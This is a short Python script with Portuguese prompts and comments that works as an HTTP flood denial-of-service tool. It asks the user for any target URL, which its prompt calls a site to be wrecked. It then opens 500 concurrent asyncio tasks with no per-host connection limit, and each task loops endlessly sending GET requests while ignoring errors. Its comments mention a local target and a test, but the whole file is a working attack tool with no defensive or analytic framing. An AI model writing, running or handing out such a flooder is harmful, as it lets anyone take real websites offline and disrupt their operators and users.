# -*- coding: utf-8 -*-
import asyncio
import aiohttp
import sys

# Alvo local
while True:
    url = input("site que vai ser fodidoXD: ")

    if url.startswith("http://") or url.startswith("https://"):
        break

    print("URL inválida, tente novamente")

print("URL:", url)
# Numero de conexoes simultaneas agressivas
CONEXOES = 500

async def enviar_requisicao(session):
    while True:
        try:
            # Envia sem esperar a resposta completa (mais agressivo)
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as response:
                await response.read()
        except:
            # Ignora erros para nao perder tempo processando texto
            pass

async def iniciar():
    print("[*] Iniciando ataque de alta velocidade...")
    print("[*] Pressione Ctrl + C para parar.")
    
    # Configura o cliente para ignorar limites de conexao por host
    connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Cria centenas de tarefas paralelas
        tarefas = [enviar_requisicao(session) for _ in range(CONEXOES)]
        await asyncio.gather(*tarefas)

try:
    asyncio.run(iniciar())
except KeyboardInterrupt:
    print("\n[*] Teste encerrado.")
    sys.exit()
